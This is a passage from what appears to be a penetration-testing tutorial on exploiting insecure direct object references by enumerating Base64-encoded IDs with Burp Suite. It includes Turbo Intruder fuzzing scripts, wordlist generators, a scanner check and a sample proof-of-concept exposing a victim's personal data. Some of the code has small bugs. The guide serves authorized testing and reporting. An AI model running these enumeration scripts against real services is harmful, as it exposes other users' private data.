    for case in edge_cases:
        payloads.append(base64.b64encode(case.encode()).decode())
    
    return list(set(payloads))  # Remove duplicates
```

### **Step 7: Configure Intruder Payloads**

```
1. Payloads tab → Payload type: "Custom iterator"
2. Add processing rules:
   - Add: Base64-encode
   - Add: URL-encode (if needed)
   
3. Payload Options:
   - Start with [1-1000] range
   - Add common usernames
   - Add system IDs
```

### **Step 8: Advanced Fuzzing with Turbo Intruder**

```python
# Turbo Intruder script for Base64 IDOR
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Generate Base64 variations
    for i in range(1, 1001):
        # Original number
        b64_encoded = base64.b64encode(str(i).encode()).decode()
        engine.queue(target.req.replace(b64_encoded, original_value))
        
        # Different encodings
        variations = [
            base64.b64encode(str(i).encode()).decode(),
            base64.b64encode(str(i).encode()).decode().rstrip('='),
            base64.b64encode(('0' + str(i)).encode()).decode(),
            base64.b64encode(('00' + str(i)).encode()).decode()
        ]
        
        for var in variations:
            engine.queue(target.req.replace(original_value, var))

def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```

---

## 🔬 **PHASE 4: DECODING & ANALYSIS**

### **Step 9: Burp Decoder Usage**

```
1. Select Base64 parameter
2. Send to Decoder (Ctrl+D)
3. Choose "Decode as" → Base64
4. Check decoded value pattern:
   - Is it numeric?
   - Is it a username?
   - Is it a file path?
   - Is it UUID/GUID?
```

### **Step 10: Custom Decoder Script**

```python
# Python script for Burp Extender
from burp import IBurpExtender, IContextMenuFactory
from javax.swing import JMenuItem
import base64

class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Base64 IDOR Helper")
        callbacks.registerContextMenuFactory(self)
        
    def createMenuItems(self, invocation):
        menu = []
        menu.append(JMenuItem("Decode Base64 IDOR", 
                   actionPerformed=lambda x: self.decode_idor(invocation)))
        return menu
    
    def decode_idor(self, invocation):
        messages = invocation.getSelectedMessages()
        for message in messages:
            request = message.getRequest()
            analyzed = self._helpers.analyzeRequest(request)
            parameters = analyzed.getParameters()
            
            for param in parameters:
                value = param.getValue()
                try:
                    decoded = base64.b64decode(value)
                    print(f"Parameter: {param.getName()}")
                    print(f"Encoded: {value}")
                    print(f"Decoded: {decoded}")
                    print("-" * 40)
                except:
                    pass
```

---

## 🎨 **PHASE 5: EXPLOITATION**

### **Step 11: Crafting Exploit Payloads**

**Generate Exploit Wordlist:**
```bash
#!/bin/bash
# Generate Base64 encoded numeric IDs

for i in {1..1000}; do
    # Standard Base64
    echo -n $i | base64
    
    # Without padding
    echo -n $i | base64 | tr -d '='
    
    # URL-safe Base64
    echo -n $i | base64 | tr '+/' '-_' | tr -d '='
    
    # With newline
    echo $i | base64
done > b64_ids.txt
```

### **Step 12: Burp Repeater Testing**

```
1. Find interesting parameter in Proxy history
2. Right-click → Send to Repeater (Ctrl+R)
3. Modify Base64 value:
   Original: id=MTIz      # "123"
   Modified: id=MTI0      # "124"
   
4. Check response differences:
   - 200 OK vs 403/404
   - Content length
   - Response data (other user's info)
   - Error messages
```

### **Step 13: Automated Testing with Scanner**

**Create Active Scan Check:**
```python
def doActiveScan(baseRequestResponse, insertionPoint):
    # Get original value
    original = insertionPoint.getBaseValue()
    
    try:
        # Decode original
        decoded = base64.b64decode(original)
        
        # Try variations
        checks = [
            (int(decoded) + 1),
            (int(decoded) - 1),
            0,
            999999
        ]
        
        for check in checks:
            encoded = base64.b64encode(str(check).encode())
            checkRequest = insertionPoint.buildRequest(encoded)
            
            # Send request
            response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest)
            
            # Analyze response
            if self.isInteresting(response):
                return [ScanIssue(...)]
                
    except:
        pass
```

---

## 📊 **PHASE 6: RESPONSE ANALYSIS**

### **Step 14: Comparison Techniques**

**Using Comparer Tool:**
```
1. Select two similar requests
2. Right-click → Send to Comparer (Ctrl+C)
3. Compare responses:
   - Words/request
   - Response times
   - Status codes
   - Content length
```

**Response Analysis Script:**
```python
def analyze_response(response):
    indicators = {
        'success': ['200 OK', '{"status":"success"'],
        'error': ['403 Forbidden', '404 Not Found', 'access denied'],
        'leak': ['email', 'password', 'ssn', 'credit card'],
        'redirect': ['302', 'Location:']
    }
    
    score = 0
    for category, patterns in indicators.items():
        for pattern in patterns:
            if pattern in response:
                if category == 'success':
                    score += 10
                elif category == 'leak':
                    score += 50
                    
    return score
```

---

## 🔧 **PHASE 7: ADVANCED TECHNIQUES**

### **Step 15: Multi-layer Encoding**

```python
# Test for double encoding
def test_double_encoding(original_value):
    exploits = []
    
    # Original number
    num = 123
    
    # Single Base64
    single = base64.b64encode(str(num).encode())
    
    # Double Base64
    double = base64.b64encode(single)
    
    # URL encode then Base64
    url_encoded = urllib.parse.quote(str(num))
    b64_url = base64.b64encode(url_encoded.encode())
    
    # Base64 then URL encode
    b64_first = base64.b64encode(str(num).encode())
    final = urllib.parse.quote(b64_first)
    
    return [single, double, b64_url, final]
```

### **Step 16: Encoding Variations Script**

```python
# Comprehensive encoding fuzzer
class Base64Fuzzer:
    def __init__(self, original_value):
        self.original = original_value
        
    def generate_variations(self):
        variations = []
        numbers = [int(self.original), 
                  int(self.original)+1, 
                  int(self.original)-1,
                  1, 0, 999999]
        
        for num in numbers:
            # Standard Base64
            std = base64.b64encode(str(num).encode())
            variations.append(std)
            
            # URL-safe Base64
            url_safe = base64.urlsafe_b64encode(str(num).encode())
            variations.append(url_safe)
            
            # Without padding
            no_pad = std.decode().rstrip('=')
            variations.append(no_pad.encode())
            
            # With multiple padding
            multi_pad = std + b'==='
            variations.append(multi_pad)
            
            # Different encodings of same number
            for fmt in ['{:d}', '{:04d}', '{:x}']:
                formatted = fmt.format(num).encode()
                variations.append(base64.b64encode(formatted))
                
        return list(set(variations))
```

---

## 📈 **PHASE 8: EXPLOITATION VALIDATION**

### **Step 17: Confirming the Vulnerability**

**Checklist for Confirmation:**
```
□ Can access another user's data
□ Received 200 OK with sensitive info
□ Response contains personal data (name, email, etc.)
□ Can modify another user's data
□ No CSRF/other protections bypassed
□ Consistent across multiple IDs
□ Works with different encoding variations
```

### **Step 18: Impact Assessment**

```python
def assess_impact(successful_exploit):
    impact_score = 0
    findings = []
    
    # Check data sensitivity
    if 'password' in response:
        impact_score += 10
        findings.append("Password exposure")
    
    if 'credit' in response or 'card' in response:
        impact_score += 20
        findings.append("Financial data exposure")
    
    if 'admin' in response or 'root' in response:
        impact_score += 15
        findings.append("Privileged account access")
    
    # Check write access
    if method in ['POST', 'PUT', 'DELETE']:
        impact_score += 5
        findings.append("Data modification possible")
    
    return {
        'score': impact_score,
        'findings': findings,
        'severity': 'Critical' if impact_score > 30 else 'High' if impact_score > 20 else 'Medium'
    }
```

---

## 📝 **PHASE 9: REPORTING**

### **Step 19: Generate Proof of Concept**

**Create POC Request/Response:**
```
=== VULNERABLE ENDPOINT ===
GET /api/user/MTI0 HTTP/1.1        # 124 in Base64
Host: example.com
Cookie: session=valid_session

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 124,
  "email": "victim@example.com",
  "name": "Victim User",
  "ssn": "123-45-6789",
  "credit_card": "4111-1111-1111-1111"
}

=== COMPARISON ===
Original (ID 123): 200 OK, own data
Modified (ID 124): 200 OK, victim's data
```

### **Step 20: Documentation Template**

```markdown
# IDOR Vulnerability Report: Base64 Encoded Parameters

## Vulnerability Type
Insecure Direct Object Reference (IDOR) via Base64 encoding

## Endpoint
`GET /api/user/{base64_id}`

## Description
The application uses Base64-encoded numeric IDs to reference user objects. 
These can be easily decoded and manipulated to access other users' data.

## Steps to Reproduce
1. Login as user "test"
2. GET /api/user/MTAw (Base64 of "100")
3. Decode to see your own data
4. Modify to MTI0 (Base64 of "124")
5. Observe victim's data in response

## Impact
- Unauthorized access to all user data
- PII exposure
- Potential account takeover
- Data breach risk

## CVSS Score
Base Score: 8.2 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

## Remediation
- Implement proper access controls
- Use indirect reference maps
- Add authorization checks
- Consider using UUIDs instead
- Rate limit API endpoints
```

---

## 🛡️ **PHASE 10: MITIGATION TESTING**

### **Step 21: Verify Fix**

```python
def test_mitigation(endpoint, payloads):
    results = []
    
    for payload in payloads:
        response = send_request(endpoint.replace('{id}', payload))
        
        if response.status_code == 200:
            # Check if data belongs to current user
            if is_authorized_user(response):
                results.append({'payload': payload, 'status': 'secure'})
            else:
                results.append({'payload': payload, 'status': 'vulnerable'})
        elif response.status_code in [403, 401, 404]:
            results.append({'payload': payload, 'status': 'blocked'})
            
    return results
```

---

## 🎯 **PRO TIPS**

### **Burp Shortcuts for IDOR Testing**
- `Ctrl+R`: Send to Repeater
- `Ctrl+I`: Send to Intruder
- `Ctrl+D`: Send to Decoder
- `Ctrl+C`: Send to Comparer
- `Ctrl+F`: Search in responses
- `Ctrl+Shift+F`: Filter history

### **Common Base64 Patterns**
- Numeric: `MTIz` (123)
- Email: `dXNlckBleGFtcGxlLmNvbQ==` (user@example.com)
- UUID: `ZjU2YzY3YjgtYzM4NC00...`
- Path: `L2hvbWUvdXNlci9maWxlLnR4dA==` (/home/user/file.txt)
- JSON: `eyJpZCI6MTIzLCJuYW1lIjoidGVzdCJ9`

### **Automation Scripts**
```bash
# Quick Base64 decode loop
while read line; do
    echo "$line -> $(echo -n "$line" | base64 -d 2>/dev/null)"
done < b64_params.txt

# Burp Suite automation with BChecks
bcheck run --file idor_base64.bcheck --target https://example.com
```

---

## 📚 **RESOURCES**

- **Burp Extensions**: Base64 Decoder, Hackvertor, Turbo Intruder
- **Wordlists**: SecLists/Discovery/Web-Content/burp-parameter-names.txt
- **Practice Labs**: PortSwigger IDOR labs, PentesterLab Base64 challenges

---

